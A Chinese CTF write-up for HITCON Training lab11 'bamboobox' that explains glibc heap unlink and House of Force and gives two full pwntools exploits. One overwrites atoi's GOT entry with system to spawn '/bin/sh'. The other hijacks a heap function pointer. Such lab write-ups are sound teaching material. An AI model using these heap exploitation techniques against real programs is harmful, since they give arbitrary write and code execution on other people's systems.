---
title: lab11_bamboobox
date: 2019-07-15
categories: 
- hitcon_trainning
tags: heap unlink HOF
---

**<font style="font-size:25px">Unlink | HOF</font>**


# UNLINK

## 概念
- 合并  

   当一个chunk不属于fastbin的范围时，就会触发**向前合并**或向后合并。  
    
   前提是合并的chunk不在使用当中。  
    
   合并之后就会被放进unsortedbin中。  
    
   之后还需要判断这个合并之后的总chunk的大小是否大于FASTBIN_CONSOLIDATION_THRESHOLD, 大于就会触发fastbins的合并操作，合并之后仍旧放入unsortedbin，直至fastbins为空。

- UNLINK触发情形

   本质就是将一个bin中的某个结点拿出来，在分配内存和由free()带来的合并操作都会触发。
    
    > 当free(a)时,a物理相邻的前一个chunk——b， **被判断** 是空闲的，那么b就会从原有bin中断开，和a合并。

- 发生了什么

   ![avatar](https://c-ssl.duitang.com/uploads/item/201907/17/20190717123925_4PJUE.png)  
   其实就是一个简单的双向链表删除某个结点，数据结构讲过很多遍的。   
   p是一个指向需要unlink的chunk的**<font style="font-size:20px">整个chunk的起始位置</font>**。     
   ```C++
   FD = *(p->fd)
   BK = *(p->bk)
   *(FD->bk) = BK
   *(BK->fd) = FD
   //p->fd == p + SZ_WORD * 2
   // 其他同理
   ```
   SZ_WORD是程序的一个字长<font style="font-size:10px">我忘却了各大源码里用的啥，瞎编的名字......</font>  

   这个堆溢出在没有很久很久以前没有检查机制的时候是可以很简单地实现地址任意写的。只要
   ```c++
   FD = target_addr - SZ_WORD * 3
   BK = shellcode
   ```
   
   unlink之后就会有
   ```c++
   *target_addr = shellcode
   ```

   但是那也是很早很早的事情了。如今开了防御措施，会检查FD->bk和BK->fd是否等于p。 

   但是也不是不能利用了，我们先要找到一个指针ptr==p。  
   ```c
   fd = ptr - SZ_WORD * 3
   bk = ptr - SZ_WORD * 2
   ```
   unlink的时候就可以绕过检查机制
   ```
   FD->bk == ptr - SZ_WORD * 3 + SZ_WORD * 3 == ptr
   BK->fd == ptr - SZ_WORD * 2 + SZ_WORD * 2 == ptr
   ```
   会得到
   ```c
   FD->bk =  ptr - SZ_WORD * 2
   BK->fd = ptr - SZ_WORD * 3
   ```
   也就是
   ```
   *ptr = ptr -  SZ_WORD * 3
   ```   
   ptr最终指向的是ptr前面一点的地方，往ptr里面写payload就能够覆盖ptr本身。然后再次往ptr里面写payload，就能实现地址任意写了。   

   在覆盖chunk_1的presize时，指的是构造的fake_chunk_0包括size和presize的大小。覆盖size的时候，原来这个地方是什么，就只要把最后一位从1变为0就好，不要改他的大小。不然会提示   
   ![avatar](https://c-ssl.duitang.com/uploads/item/201907/17/20190717123925_jHZju.png)   
   
   但是我不知道为什么。按理来说，应该没得关系，难道是因为AMP里面的p位标识是0？可是double free不也可以吗，而且也不会报和size有关的错叭？
      
  unlink可以看一个大佬写的<a href="http://manyface.github.io/2016/05/19/AndroidHeapUnlinkExploitPractice">关于unlink的分析 </a>超详细超厉害der！


## 思路

<font style="font-size:10px">其实是艰辛的心路历程</font>  

这道题是昨天晚上这个时间就想到的思路。 <font style="font-size:10px">[虽然是道基础题但是是难得的一道没看别人exp就想到怎么写的题开心程度堪比拿了ctf全世界冠军（bushi]</font> 毕竟是一道套路题。<font style="font-size:10px">的确套路了我【微笑.jpg】</font>   

> change_note这个函数里面没有检查输入长度，堆溢出。堆的几个漏洞里面，堆溢出我只会unlink，所以就顺着这个思路一直往下写了。  

### 整个chunk的起始位置

- 这个整个chunk的起始位置和presize、size就是今天的一个我的大坑之一。  
   
    nodelist的地址指向的是非空闲chunk数据开始的地方，而检查的时候，是检查这个地址是不是指向这个chunk的presize。   
    
    我一开始想的是用chunk_0溢出伪造chunk_1空闲的假象，然后free(chunk_0)。也就是向后合并。

    我错在直接在chunk_1的原来的presize的地方开始构造，但是nodelist[1]不指向这里，也没有一个可以利用的指向这里的指针，所以通不过防御机制。

    而且就算我从nodelist[1]这个地方开始构造，因为没有改到chunk_0的size域，导致ptmalloc找chunk_1的时候找到的还是chunk_1的presize的地方。


    所以这个题是只能向前合并的[我jio得]。

    size 和 presize就纯粹是脑子没转过弯来以及知识盲区。

- 哇塞真的好菜啊TAT



## **惊天大坑！**

昨天一晚上今天一上午，我都在想，为什么，我的exp让一个chunk在free之后，只是把相关数据清零，但是这个chunk并没有被放进任何一个bins。    

然后我找了别人的exp跑了一下，卡死了。   

我直接用gdb调试二进制文件，发现不是exp的原因，free()这个函数就很玄学，他不按说好的来啊根本就！！   

我环境是glibc2.27, 师傅让我在2.23里面跑一下。   
发现是没问题的。

<font style="font-size:10px">  
含恨在2.23里面调试，但是2.23不行啊，生成容器的时候默认的安全机制开太大了gdb根本没法用。师傅说的解决方法我没有理解，于是又看了一下午docker怎么用 *[露出菜鸟的疲惫微笑]* 。我以为就是在run一个新的容器就好，没想到这个最简单的镜像里啥都没有。这里不得不说感谢师傅帮忙装好了python和gdb和一些别的环境，我一下子真的弄不来[头秃]。最后灵光一闪懂了大佬说的那个解决方法，用现有容器commit一个镜像再run一个容器。【菜是真的菜】</font>

那么2.27到底是个什么机制我也没有搜到。

## exp

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
sh = process('./bamboobox')
elf = ELF('./bamboobox')
libc = elf.libc

atoi_libc = libc.symbols['atoi']
atoi_got = elf.got['atoi']
system_libc = libc.symbols['system']
notelist_addr = 0x6020C8

def add_note(length,content):
    sh.sendlineafter('choice:','2')
    sh.sendlineafter('name:',str(length))
    sh.sendlineafter('item:',content)

def show_note(idx):
    sh.sendlineafter('choice:','1')
    sh.recvuntil(str(idx)+' :')
    addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    return addr

def change_note(idx,length,content):
    sh.sendlineafter('choice:','3')
    sh.sendlineafter('item:',str(idx))
    sh.sendlineafter('name:',str(length))
    sh.sendafter('item:',content)

def del_note(idx):
    sh.sendlineafter('choice:','4')
    sh.sendlineafter('item',str(idx))


add_note(0x80,'a'*8)
add_note(0x80,'b'*8)

payload = p64(0) + p64(0x81) + p64(notelist_addr -24) + p64(notelist_addr - 16) 
payload = payload.ljust(0x80,'A')
payload += p64(0x80) + p64(0x90) 

change_note(0,len(payload),payload)
del_note(1)

payload = 'A'*24 + p64(atoi_got)

change_note(0,len(payload),payload)

atoi_addr = show_note(0)
system_addr = atoi_addr - atoi_libc + system_libc

payload = p64(system_addr)
change_note(0,len(payload),payload)
sh.sendlineafter('choice:','/bin/sh\x00')

sh.interactive()
sh.close()
```

# House of Force

## 概念

在向top  chunk分割出内存时进行的操作：
```c++
// 获取当前的top chunk，并计算其对应的大小
victim = av->top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) //<============
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;// <=================
    set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```   

控制top  chunk的指针 `av->top` 指向目的地址，当再次需要malloc的时候，就会返回一个目的地址的指针，通过这个指针就可以更改目的地址的内容。   

其实就是地址任意写。   

利用要求是：   
1. 堆溢出的条件
2. 分配大小可以自己定

实现比较难的地方是计算分配的大小。    
```c
//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
// (The minimumsize is 16 bytes on most 32bits systems, and 24 or 32 bytes on 64bits systems.)
#define request2size(req)                                                      
(((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE）? 
        MINSIZE: 
        ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &~MALLOC_ALIGN_MASK)
```

详见ctfwiki。

## 解法 

这道题用hof的话要分配三次内存。   
第一次是用来控制top_chunk的size，   
第二次是用来将top_chunk指向目标位置，  
第三次是用来在目标位置写入数据。   

第一次分配的chunk大小须大于`MINSIZE`，   
第二次这个目标位置：
- 我一开始是接着用atoi的got表地址的。但是题目虽然没有开PIE，我的环境是开了ASLR的，也就是说无法确定topchunk的具体位置，所以需要设置
    ```python
    sh = process('./bamboobox',aslr=0)
    ```
- 本地这个样子是可以，但是我觉得打远程也这样就会很悬。
- 因为程序一开始设置了两个函数指针存在堆里面，分别在开始和结束的时候调用，而这个地方离top_chunk的距离是可以计算的，所以这个地方是可以覆盖的。system是不可能了，但是程序有一个magic函数。

    ![avatar](https://c-ssl.duitang.com/uploads/item/201907/17/20190717123925_zsM2M.png) 

## exp
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
sh = process('./bamboobox')
elf = ELF('./bamboobox')
libc = elf.libc

atoi_libc = libc.symbols['atoi']
atoi_got = elf.got['atoi']
system_libc = libc.symbols['system']
notelist_addr = 0x6020C8
magic = 0x0400D49

def add_note(length,content):
    sh.sendlineafter('choice:','2')
    sh.sendlineafter('name:',str(length))
    sh.sendafter('item:',content)

def show_note(idx):
    sh.sendlineafter('choice:','1')
    sh.recvuntil(str(idx)+' :')
    addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
    return addr

def change_note(idx,length,content):
    sh.sendlineafter('choice:','3')
    sh.sendlineafter('item:',str(idx))
    sh.sendlineafter('name:',str(length))
    sh.sendafter('item:',content)

def del_note(idx):
    sh.sendlineafter('choice:','4')
    sh.sendlineafter('item',str(idx))

length = 0x60
add_note(length,'a'*8)

pause()
payload = 'A' * length + p64(0x0) + p64(0xffffffffffffffff)
change_note(0,len(payload),payload)

# a的chunk 总大小是 length + 0x10，v 的 chunk 大小是0x20，SIZE_SZ 是 0x10。原本就是对齐的，所以不需要+ mask
req = -( length  + 0x10 ) - 0x20 - 0x10
add_note(req,'a' * 8)

add_note(0x10,p64(magic)*2)

sh.sendlineafter('choice:','5')
sh.interactive()
sh.close()

```

## 注意

仍旧需要在glibc2.23的环境下才能跑。[为什么啊！！]

